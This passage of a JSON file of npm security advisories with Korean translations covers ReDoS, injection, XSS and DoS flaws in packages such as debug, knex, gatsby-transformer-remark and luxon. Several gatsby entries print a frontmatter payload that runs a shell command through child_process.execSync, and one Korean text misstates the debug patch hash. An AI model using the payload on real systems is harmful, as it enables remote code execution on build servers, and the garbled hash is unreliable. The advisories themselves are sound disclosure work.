    "descriptionKR": "Prestaul skeemas에서 취약점이 발견되어 문제가 있는 것으로 분류되었습니다. 이 문제는 validators/base.js 파일의 일부 알 수 없는 처리에 영향을 미칩니다. uri 인수를 조작하면 비효율적인 정규식이 복잡해집니다. 패치의 이름은 65e94eda62dc8dc148ab3e59aa2ccc086ac448fd입니다. 이 문제를 해결하려면 패치를 적용하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-218003입니다."
  },
  {
    "description": "A vulnerability classified as problematic has been found in debug-js debug up to 3.0.x. This affects the function useColors of the file src/node.js. The manipulation of the argument str leads to inefficient regular expression complexity. Upgrading to version 3.1.0 is able to address this issue. The name of the patch is c38a0166c266a679c8de012d4eaccec3f944e685. It is recommended to upgrade the affected component. The identifier VDB-217665 was assigned to this vulnerability. The patch has been backported to the 2.6.x branch in version 2.6.9.",
    "identifiers": "GHSA : GHSA-9vvw-cc9w-f27h\nCVE : CVE-2017-20165",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:03:24Z",
    "publishedAt": "2023-01-09T12:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-20165\nhttps://github.com/debug-js/debug/pull/504\nhttps://github.com/debug-js/debug/commit/c38a0166c266a679c8de012d4eaccec3f944e685\nhttps://github.com/debug-js/debug/releases/tag/3.1.0\nhttps://vuldb.com/?id.217665\nhttps://github.com/debug-js/debug/releases/tag/2.6.9\nhttps://vuldb.com/?ctiid.217665\nhttps://github.com/advisories/GHSA-9vvw-cc9w-f27h",
    "name": "debug",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.9",
    "identifier": "2.6.9",
    "descriptionKR": "debug-js 디버그 3.0.x까지 문제로 분류된 취약점이 발견되었습니다. 이는 src/node.js 파일의 useColors 함수에 영향을 미칩니다. str 인수를 조작하면 비효율적인 정규식이 복잡해집니다. 버전 3.1.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 c38a0166c266a679c8de012d4eccec3f944e685입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-217665가 이 취약점에 할당되었습니다. 패치는 버전 2.6.9에서 2.6.x 분기로 백포트되었습니다."
  },
  {
    "description": "### Impact\nThe gatsby-transformer-remark plugin prior to versions 5.25.1 and 6.3.2 passes input through to the `gray-matter` npm package, which is vulnerable to JavaScript injection in its default configuration, unless input is sanitized.  The vulnerability is present in gatsby-transformer-remark when passing input in data mode (querying MarkdownRemark nodes via GraphQL).  Injected JavaScript executes in the context of the build server.\n\nTo exploit this vulnerability untrusted/unsanitized input would need to be sourced by or added into a file processed by gatsby-transformer-remark.  The following payload demonstrates a vulnerable configuration:\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n--- \n```\n\n### Patches\nA patch has been introduced in `gatsby-transformer-remark@5.25.1` and `gatsby-transformer-remark@6.3.2` which mitigates the issue by disabling the `gray-matter` JavaScript Frontmatter engine.  The patch introduces a new option, `JSFrontmatterEngine` which is set to `false` by default.  When setting `JSFrontmatterEngine` to `true`, input passed to `gatsby-plugin-mdx` must be sanitized before processing to avoid a security risk.  Warnings are displayed when enabling `JSFrontmatterEngine` to `true` or if it appears that the MarkdownRemark input is attempting to use the Frontmatter engine.\n\n### Workarounds\nIf an older version of `gatsby-transformer-remark` must be used, input passed into the plugin should be sanitized ahead of processing.\n\n**We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.**\n\n\n### For more information\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
    "identifiers": "GHSA : GHSA-7ch4-rr99-cqcw\nCVE : CVE-2023-22491",
    "severity": "HIGH",
    "updatedAt": "2023-01-23T18:42:38Z",
    "publishedAt": "2023-01-11T18:27:15Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-7ch4-rr99-cqcw\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22491\nhttps://github.com/advisories/GHSA-7ch4-rr99-cqcw",
    "name": "gatsby-transformer-remark",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.25.1",
    "identifier": "5.25.1",
    "descriptionKR": "### 영향\n버전 5.25.1 및 6.3.2 이전의 gatsby-transformer-remark 플러그인은 'gray-matter' npm 패키지로 입력을 전달합니다. 이 패키지는 입력이 삭제되지 않는 한 기본 구성에서 JavaScript 삽입에 취약합니다. 취약점은 데이터 모드에서 입력을 전달할 때 gatsby-transformer-remark에 존재합니다(GraphQL을 통해 MarkdownRemark 노드 쿼리). 주입된 JavaScript는 빌드 서버의 컨텍스트에서 실행됩니다.\n\n이 취약점을 악용하려면 신뢰할 수 없거나 삭제되지 않은 입력을 gatsby-transformer-remark에서 처리하는 파일에서 가져오거나 파일에 추가해야 합니다. 다음 페이로드는 취약한 구성을 보여줍니다.\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n---\n```\n\n### 패치\n`gatsby-transformer-remark@5.25.1` 및 `gatsby-transformer-remark@6.3.2`에는 `gray-matter` JavaScript Frontmatter 엔진을 비활성화하여 문제를 완화하는 패치가 도입되었습니다. 이 패치는 기본적으로 'false'로 설정되는 새로운 옵션인 'JSFrontmatterEngine'을 도입합니다. `JSFrontmatterEngine`을 `true`로 설정할 때 `gatsby-plugin-mdx`로 전달된 입력은 보안 위험을 피하기 위해 처리 전에 삭제되어야 합니다. 'JSFrontmatterEngine'을 'true'로 활성화하거나 MarkdownRemark 입력이 Frontmatter 엔진을 사용하려고 시도하는 것으로 나타나면 경고가 표시됩니다.\n\n### 해결 방법\n이전 버전의 `gatsby-transformer-remark`를 사용해야 하는 경우 플러그인에 전달된 입력은 처리 전에 삭제되어야 합니다.\n\n**최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 프로젝트를 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 업그레이드하는 것이 좋습니다.**\n\n\n### 자세한 내용은\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nThe gatsby-transformer-remark plugin prior to versions 5.25.1 and 6.3.2 passes input through to the `gray-matter` npm package, which is vulnerable to JavaScript injection in its default configuration, unless input is sanitized.  The vulnerability is present in gatsby-transformer-remark when passing input in data mode (querying MarkdownRemark nodes via GraphQL).  Injected JavaScript executes in the context of the build server.\n\nTo exploit this vulnerability untrusted/unsanitized input would need to be sourced by or added into a file processed by gatsby-transformer-remark.  The following payload demonstrates a vulnerable configuration:\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n--- \n```\n\n### Patches\nA patch has been introduced in `gatsby-transformer-remark@5.25.1` and `gatsby-transformer-remark@6.3.2` which mitigates the issue by disabling the `gray-matter` JavaScript Frontmatter engine.  The patch introduces a new option, `JSFrontmatterEngine` which is set to `false` by default.  When setting `JSFrontmatterEngine` to `true`, input passed to `gatsby-plugin-mdx` must be sanitized before processing to avoid a security risk.  Warnings are displayed when enabling `JSFrontmatterEngine` to `true` or if it appears that the MarkdownRemark input is attempting to use the Frontmatter engine.\n\n### Workarounds\nIf an older version of `gatsby-transformer-remark` must be used, input passed into the plugin should be sanitized ahead of processing.\n\n**We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.**\n\n\n### For more information\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
    "identifiers": "GHSA : GHSA-7ch4-rr99-cqcw\nCVE : CVE-2023-22491",
    "severity": "HIGH",
    "updatedAt": "2023-01-23T18:42:38Z",
    "publishedAt": "2023-01-11T18:27:15Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-7ch4-rr99-cqcw\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22491\nhttps://github.com/advisories/GHSA-7ch4-rr99-cqcw",
    "name": "gatsby-transformer-remark",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.3.2",
    "identifier": "6.3.2",
    "descriptionKR": "### 영향\n버전 5.25.1 및 6.3.2 이전의 gatsby-transformer-remark 플러그인은 'gray-matter' npm 패키지로 입력을 전달합니다. 이 패키지는 입력이 삭제되지 않는 한 기본 구성에서 JavaScript 삽입에 취약합니다. 취약점은 데이터 모드에서 입력을 전달할 때 gatsby-transformer-remark에 존재합니다(GraphQL을 통해 MarkdownRemark 노드 쿼리). 주입된 JavaScript는 빌드 서버의 컨텍스트에서 실행됩니다.\n\n이 취약점을 악용하려면 신뢰할 수 없거나 삭제되지 않은 입력을 gatsby-transformer-remark에서 처리하는 파일에서 가져오거나 파일에 추가해야 합니다. 다음 페이로드는 취약한 구성을 보여줍니다.\n```\n---js\n((require(\"child_process\")).execSync(\"id >> /tmp/rce\"))\n---\n```\n\n### 패치\n`gatsby-transformer-remark@5.25.1` 및 `gatsby-transformer-remark@6.3.2`에는 `gray-matter` JavaScript Frontmatter 엔진을 비활성화하여 문제를 완화하는 패치가 도입되었습니다. 이 패치는 기본적으로 'false'로 설정되는 새로운 옵션인 'JSFrontmatterEngine'을 도입합니다. `JSFrontmatterEngine`을 `true`로 설정할 때 `gatsby-plugin-mdx`로 전달된 입력은 보안 위험을 피하기 위해 처리 전에 삭제되어야 합니다. 'JSFrontmatterEngine'을 'true'로 활성화하거나 MarkdownRemark 입력이 Frontmatter 엔진을 사용하려고 시도하는 것으로 나타나면 경고가 표시됩니다.\n\n### 해결 방법\n이전 버전의 `gatsby-transformer-remark`를 사용해야 하는 경우 플러그인에 전달된 입력은 처리 전에 삭제되어야 합니다.\n\n**최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 프로젝트를 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 업그레이드하는 것이 좋습니다.**\n\n\n### 자세한 내용은\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "Knex Knex.js through 2.3.0 has a limited SQL injection vulnerability that can be exploited to ignore the WHERE clause of a SQL query. This vulnerability has been fixed in version 2.4.0.",
    "identifiers": "GHSA : GHSA-4jv9-3563-23j3\nCVE : CVE-2016-20018",
    "severity": "HIGH",
    "updatedAt": "2023-02-03T05:01:32Z",
    "publishedAt": "2022-12-19T09:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-20018\nhttps://github.com/knex/knex/issues/1227\nhttps://www.ghostccamm.com/blog/knex_sqli/\nhttps://github.com/knex/knex/releases/tag/2.4.0\nhttps://github.com/advisories/GHSA-4jv9-3563-23j3",
    "name": "knex",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.4.0",
    "identifier": "2.4.0",
    "descriptionKR": "Knex Knex.js ~ 2.3.0에는 SQL 쿼리의 WHERE 절을 무시하는 데 악용될 수 있는 제한된 SQL 주입 취약점이 있습니다. 이 취약점은 버전 2.4.0에서 수정되었습니다."
  },
  {
    "description": "tag.ex in Phoenix Phoenix.HTML (aka phoenix_html) before 3.0.4 allows XSS in HEEx class attributes",
    "identifiers": "GHSA : GHSA-5g2h-9x5v-5h3x\nCVE : CVE-2021-46871",
    "severity": "MODERATE",
    "updatedAt": "2023-04-06T22:57:42Z",
    "publishedAt": "2023-01-10T06:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-46871\nhttps://github.com/phoenixframework/phoenix_html/commit/62a0139fb716bcdce697f6221244bd81d321d620\nhttps://github.com/advisories/GHSA-j3gg-r6gp-95q2\nhttps://github.com/advisories/GHSA-5g2h-9x5v-5h3x",
    "name": "phoenix_html",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.4",
    "identifier": "3.0.4",
    "descriptionKR": "3.0.4 이전의 Phoenix Phoenix.HTML(일명 phoenix_html)의 tag.ex는 HEEx 클래스 속성의 XSS를 허용합니다."
  },
  {
    "description": "### Impact\n\n* An attacker can inject attributes that are used in other components\n* An attacker can override existing attributes with ones that have incompatible type, which may lead to a crash.\n\nThe main use case of Convict is for handling server-side configurations written by the admins owning the servers, and not random users. So it's unlikely that an admin would deliberately sabotage their own server. Still a situation can happen where an admin not knowledgeable about JavaScript could be tricked by an attacker into writing the malicious JavaScript code into some config files.\n\n### Patches\nThe problem is patched in `convict@6.2.4`. Users should upgrade to `convict@6.2.4`.\n\n### Workarounds\nNo way for users to fix or remediate the vulnerability without upgrading\n\n### References\nhttps://github.com/mozilla/node-convict/issues/410\n",
    "identifiers": "GHSA : GHSA-4jrm-c32x-w4jf\nCVE : CVE-2023-0163",
    "severity": "HIGH",
    "updatedAt": "2023-02-09T17:41:50Z",
    "publishedAt": "2023-01-10T21:50:00Z",
    "references": "https://github.com/mozilla/node-convict/security/advisories/GHSA-4jrm-c32x-w4jf\nhttps://github.com/mozilla/node-convict/commit/fb602fbe1e9f14f2e88ecb8179d0f76466d21ecb\nhttps://github.com/advisories/GHSA-4jrm-c32x-w4jf",
    "name": "convict",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.2.4",
    "identifier": "6.2.4",
    "descriptionKR": "### 영향\n\n* 공격자는 다른 구성 요소에서 사용되는 속성을 주입할 수 있습니다.\n* 공격자는 충돌로 이어질 수 있는 호환되지 않는 유형을 가진 속성으로 기존 속성을 재정의할 수 있습니다.\n\nConvict의 주요 사용 사례는 무작위 사용자가 아닌 서버를 소유한 관리자가 작성한 서버 측 구성을 처리하는 것입니다. 따라서 관리자가 의도적으로 자신의 서버를 방해할 가능성은 거의 없습니다. 여전히 JavaScript에 대해 잘 모르는 관리자가 공격자에게 속아 악성 JavaScript 코드를 일부 구성 파일에 작성하도록 할 수 있는 상황이 발생할 수 있습니다.\n\n### 패치\n해당 문제는 `convict@6.2.4`에서 패치되었습니다. 사용자는 `convict@6.2.4`로 업그레이드해야 합니다.\n\n### 해결 방법\n사용자가 업그레이드하지 않고는 취약점을 수정하거나 치료할 수 있는 방법이 없습니다.\n\n### 참조\nhttps://github.com/mozilla/node-convict/issues/410"
  },
  {
    "description": "A vulnerability, which was classified as problematic, has been found in vercel ms up to 1.x. This issue affects the function parse of the file index.js. The manipulation of the argument str leads to inefficient regular expression complexity. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 2.0.0 is able to address this issue. The name of the patch is caae2988ba2a37765d055c4eee63d383320ee662. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217451.",
    "identifiers": "GHSA : GHSA-w9mr-4mfr-499f\nCVE : CVE-2017-20162",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:09Z",
    "publishedAt": "2023-01-05T12:30:27Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-20162\nhttps://github.com/vercel/ms/pull/89\nhttps://github.com/vercel/ms/commit/caae2988ba2a37765d055c4eee63d383320ee662\nhttps://github.com/vercel/ms/releases/tag/2.0.0\nhttps://vuldb.com/?ctiid.217451\nhttps://vuldb.com/?id.217451\nhttps://github.com/advisories/GHSA-w9mr-4mfr-499f",
    "name": "ms",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.0",
    "identifier": "2.0.0",
    "descriptionKR": "문제로 분류된 취약점이 vercel ms 1.x까지 발견되었습니다. 이 문제는 index.js 파일의 구문 분석 기능에 영향을 미칩니다. str 인수를 조작하면 비효율적인 정규식이 복잡해집니다. 공격은 원격으로 시작될 수 있습니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 버전 2.0.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 caae2988ba2a37765d055c4eee63d383320ee662입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-217451입니다."
  },
  {
    "description": "### Impact\n\nAny users of Mercurius until version v11.5.0 are subjected to a denial of service attack by sending a malformed packet over WebSocket to `/graphql`.\n\n### Patches\n\nThis was patched in https://github.com/mercurius-js/mercurius/pull/940.\nThe patch was released as v11.5.0 and v8.13.2.\n\n### Workarounds\n\nDisable subscriptions.\n\n### References\n\nReported publicly as https://github.com/mercurius-js/mercurius/issues/939.\nThe same problem was solved in https://github.com/fastify/fastify-websocket/pull/228\n",
    "identifiers": "GHSA : GHSA-cm8h-q92v-xcfc\nCVE : CVE-2023-22477",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:01:34Z",
    "publishedAt": "2023-01-09T21:55:44Z",
    "references": "https://github.com/mercurius-js/mercurius/security/advisories/GHSA-cm8h-q92v-xcfc\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22477\nhttps://github.com/mercurius-js/mercurius/issues/939\nhttps://github.com/fastify/fastify-websocket/pull/228\nhttps://github.com/mercurius-js/mercurius/pull/940\nhttps://github.com/advisories/GHSA-cm8h-q92v-xcfc",
    "name": "mercurius",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 8.13.2",
    "identifier": "8.13.2",
    "descriptionKR": "### 영향\n\n버전 v11.5.0까지 Mercurius의 모든 사용자는 WebSocket을 통해 `/graphql`에 잘못된 형식의 패킷을 전송하여 서비스 거부 공격을 받습니다.\n\n### 패치\n\n이는 https://github.com/mercurius-js/mercurius/pull/940에서 패치되었습니다.\n패치는 v11.5.0 및 v8.13.2로 릴리스되었습니다.\n\n### 해결 방법\n\n구독을 비활성화합니다.\n\n### 참조\n\n공개적으로 https://github.com/mercurius-js/mercurius/issues/939로 보고되었습니다.\n동일한 문제가 https://github.com/fastify/fastify-websocket/pull/228에서 해결되었습니다."
  },
  {
    "description": "### Impact\n\nAny users of Mercurius until version v11.5.0 are subjected to a denial of service attack by sending a malformed packet over WebSocket to `/graphql`.\n\n### Patches\n\nThis was patched in https://github.com/mercurius-js/mercurius/pull/940.\nThe patch was released as v11.5.0 and v8.13.2.\n\n### Workarounds\n\nDisable subscriptions.\n\n### References\n\nReported publicly as https://github.com/mercurius-js/mercurius/issues/939.\nThe same problem was solved in https://github.com/fastify/fastify-websocket/pull/228\n",
    "identifiers": "GHSA : GHSA-cm8h-q92v-xcfc\nCVE : CVE-2023-22477",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:01:34Z",
    "publishedAt": "2023-01-09T21:55:44Z",
    "references": "https://github.com/mercurius-js/mercurius/security/advisories/GHSA-cm8h-q92v-xcfc\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22477\nhttps://github.com/mercurius-js/mercurius/issues/939\nhttps://github.com/fastify/fastify-websocket/pull/228\nhttps://github.com/mercurius-js/mercurius/pull/940\nhttps://github.com/advisories/GHSA-cm8h-q92v-xcfc",
    "name": "mercurius",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 9.0.0, < 11.5.0",
    "identifier": "11.5.0",
    "descriptionKR": "### 영향\n\n버전 v11.5.0까지 Mercurius의 모든 사용자는 WebSocket을 통해 `/graphql`에 잘못된 형식의 패킷을 전송하여 서비스 거부 공격을 받습니다.\n\n### 패치\n\n이는 https://github.com/mercurius-js/mercurius/pull/940에서 패치되었습니다.\n패치는 v11.5.0 및 v8.13.2로 릴리스되었습니다.\n\n### 해결 방법\n\n구독을 비활성화합니다.\n\n### 참조\n\n공개적으로 https://github.com/mercurius-js/mercurius/issues/939로 보고되었습니다.\n동일한 문제가 https://github.com/fastify/fastify-websocket/pull/228에서 해결되었습니다."
  },
  {
    "description": "# Impact\nLuxon's `DateTime.fromRFC2822() has quadratic (N^2) complexity on some specific inputs. This causes a noticeable slowdown for inputs with lengths above 10k characters. Users providing untrusted data to this method are therefore vulnerable to (Re)DoS attacks.\n\nThis is the same bug as Moment's https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\n\n# Workarounds\nLimit the length of the input.\n\n# References\nThere is an excellent writeup of the same issue in Moment: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# Details\n`DateTime.fromRFC2822(\"(\".repeat(500000))` takes a couple minutes to complete.",
    "identifiers": "GHSA : GHSA-3xq5-wjfh-ppjc\nCVE : CVE-2023-22467",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:01:41Z",
    "publishedAt": "2023-01-09T14:10:49Z",
    "references": "https://github.com/moment/luxon/security/advisories/GHSA-3xq5-wjfh-ppjc\nhttps://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-22467\nhttps://github.com/moment/moment/pull/6015#issuecomment-1152961973\nhttps://github.com/moment/luxon/commit/5ab3bf64a10da929a437629cdb2f059bb83212bf\nhttps://github.com/advisories/GHSA-3xq5-wjfh-ppjc",
    "name": "luxon",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 1.28.1",
    "identifier": "1.28.1",
    "descriptionKR": "# 영향\nLuxon의 `DateTime.fromRFC2822()는 일부 특정 입력에서 2차(N^2) 복잡도를 가집니다. 이로 인해 길이가 10k 문자를 초과하는 입력의 경우 눈에 띄게 속도가 느려집니다. 따라서 이 방법에 신뢰할 수 없는 데이터를 제공하는 사용자는 (Re)DoS 공격에 취약합니다.\n\nMoment의 https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g와 동일한 버그입니다.\n\n# 해결 방법\n입력 길이를 제한합니다.\n\n# 참조\nMoment에 같은 문제에 대한 훌륭한 글이 있습니다: https://github.com/moment/moment/pull/6015#issuecomment-1152961973\n\n# 세부사항\n`DateTime.fromRFC2822(\"(\".repeat(500000))`는 완료하는 데 몇 분 정도 걸립니다."
  },
  {
    "description": "A vulnerability was found in flitto express-param up to 0.x. It has been classified as critical. This affects an unknown part of the file `lib/fetchParams.js`. The manipulation leads to improper handling of extra parameters. It is possible to initiate the attack remotely. Upgrading to version 1.0.0 can address this issue. The name of the patch is db94f7391ad0a16dcfcba8b9be1af385b25c42db. It is recommended to upgrade the affected component. The identifier VDB-217149 was assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-fr54-72wr-cqvq\nCVE : CVE-2017-20160",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:01:18Z",
    "publishedAt": "2022-12-31T21:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2017-20160\nhttps://github.com/flitto/express-param/pull/19\nhttps://github.com/flitto/express-param/commit/db94f7391ad0a16dcfcba8b9be1af385b25c42db\nhttps://github.com/flitto/express-param/releases/tag/1.0.0\nhttps://vuldb.com/?ctiid.217149\nhttps://vuldb.com/?id.217149\nhttps://github.com/advisories/GHSA-fr54-72wr-cqvq",
    "name": "express-param",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.0",
    "identifier": "1.0.0",
    "descriptionKR": "flitto express-param 0.x까지 취약점이 발견되었습니다. 크리티컬로 분류되었습니다. 이는 `lib/fetchParams.js` 파일의 알 수 없는 부분에 영향을 미칩니다. 조작으로 인해 추가 매개변수가 부적절하게 처리됩니다. 공격을 원격으로 시작할 수 있습니다. 버전 1.0.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치의 이름은 db94f7391ad0a16dcfcba8b9be1af385b25c42db입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-217149가 이 취약점에 할당되었습니다."
  },
  {
    "description": "All versions of the package wifey are vulnerable to Command Injection via the `connect()` function due to improper input sanitization.",
    "identifiers": "GHSA : GHSA-xj9v-6q2f-vqhx\nCVE : CVE-2022-25890",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:03:14Z",
    "publishedAt": "2023-01-09T06:30:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25890\nhttps://security.snyk.io/vuln/SNYK-JS-WIFEY-3175615\nhttps://github.com/advisories/GHSA-xj9v-6q2f-vqhx",
    "name": "wifey",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.0.7",
    "descriptionKR": "모든 버전의 wifey 패키지는 부적절한 입력 삭제로 인해 `connect()` 함수를 통한 명령 주입에 취약합니다."
  },
  {
    "description": "A vulnerability was found in Yomguithereal Baobab up to 2.6.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack can be launched remotely. Upgrading to version 2.6.1 is able to address this issue. The name of the patch is c56639532a923d9a1600fb863ec7551b188b5d19. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-217627.",
    "identifiers": "GHSA : GHSA-wvr2-q86m-6whp\nCVE : CVE-2021-4307",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-28T05:03:47Z",
    "publishedAt": "2023-01-07T21:30:38Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4307\nhttps://github.com/Yomguithereal/baobab/pull/511\nhttps://github.com/Yomguithereal/baobab/commit/c56639532a923d9a1600fb863ec7551b188b5d19\nhttps://github.com/Yomguithereal/baobab/releases/tag/2.6.1\nhttps://vuldb.com/?ctiid.217627\nhttps://vuldb.com/?id.217627\nhttps://github.com/advisories/GHSA-wvr2-q86m-6whp",
    "name": "baobab",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.1",
    "identifier": "2.6.1",
    "descriptionKR": "Yomguithereal Baobab 2.6.0까지 취약점이 발견되었습니다. 중요하다고 선언되었습니다. 이 취약점의 영향을 받는 기능은 알 수 없습니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 공격은 원격으로 시작할 수 있습니다. 버전 2.6.1로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 c56639532a923d9a1600fb863ec7551b188b5d19입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 이 취약점의 관련 식별자는 VDB-217627입니다."
  },
  {
    "description": "A vulnerability classified as problematic has been found in Twitter-Post-Fetcher up to 17.x. This affects an unknown part of the file `js/twitterFetcher.js` of the component Link Target Handler. The manipulation leads to use of web link to untrusted target with window.opener access. It is possible to initiate the attack remotely. Upgrading to version 18.0.0 can address this issue. The name of the patch is 7d281c6fb5acbc29a2cad295262c1f0c19ca56f3. It is recommended to upgrade the affected component. The identifier VDB-217017 was assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-m688-cx2p-rgq9\nCVE : CVE-2018-25058",
    "severity": "MODERATE",
    "updatedAt": "2023-02-02T05:01:18Z",
    "publishedAt": "2022-12-29T09:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-25058\nhttps://github.com/jasonmayes/Twitter-Post-Fetcher/pull/170\nhttps://github.com/jasonmayes/Twitter-Post-Fetcher/commit/7d281c6fb5acbc29a2cad295262c1f0c19ca56f3\nhttps://github.com/jasonmayes/Twitter-Post-Fetcher/releases/tag/18.0.0\nhttps://vuldb.com/?ctiid.217017\nhttps://vuldb.com/?id.217017\nhttps://github.com/advisories/GHSA-m688-cx2p-rgq9",
    "name": "twitter-fetcher-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 18.0.0",
    "identifier": "18.0.0",
    "descriptionKR": "문제로 분류된 취약점이 Twitter-Post-Fetcher 17.x까지 발견되었습니다. 이것은 구성요소 Link Target Handler의 `js/twitterFetcher.js` 파일의 알 수 없는 부분에 영향을 미칩니다. 이 조작으로 인해 window.opener 액세스 권한이 있는 신뢰할 수 없는 대상에 대한 웹 링크가 사용됩니다. 공격을 원격으로 시작할 수 있습니다. 버전 18.0.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 7d281c6fb5acbc29a2cad295262c1f0c19ca56f3입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-217017이 이 취약점에 할당되었습니다."
  },
  {
    "description": "An open redirect vulnerability exists in Okta OIDC Middleware prior to version 5.0.0 allowing an attacker to redirect a user to an arbitrary URL.\n\n**Affected products and versions**\nOkta OIDC Middleware prior to version 5.0.0.\n\n**Resolution**\nThe vulnerability is fixed in OIDC Middleware 5.0.0.  To remediate this vulnerability, upgrade Okta OIDC Middleware to this version or later.\n\n**CVE details**\n**CVE ID:**\t\t[CVE-2022-3145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-3145)\n**Published Date:**\t01/05/2023\n**Vulnerability Type:**\tOpen Redirect\n**CWE:**\t\t\tCWE-601\n**CVSS v3.1 Score:** 4.3\n**Severity:** Medium\n**Vector string:** AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N\n\n**Severity Details**\nTo exploit this issue, an attacker would need to send a victim a malformed URL containing a target server that they control. Once a user successfully completed the login process, the victim user would then be redirected to the attacker controlled site.\n\n**References**\nhttps://github.com/okta/okta-oidc-middleware",
    "identifiers": "GHSA : GHSA-58h4-9m7m-j9m4\nCVE : CVE-2022-3145",
    "severity": "MODERATE",
    "updatedAt": "2023-02-07T05:06:20Z",
    "publishedAt": "2023-01-09T20:06:02Z",
    "references": "https://github.com/okta/okta-oidc-middleware/security/advisories/GHSA-58h4-9m7m-j9m4\nhttps://github.com/okta/okta-oidc-middleware/commit/5d10b3ccdd5d6893de4d8b58696094267d30c113\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-3145\nhttps://github.com/advisories/GHSA-58h4-9m7m-j9m4",
    "name": "@okta/oidc-middleware",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.0",
    "identifier": "5.0.0",
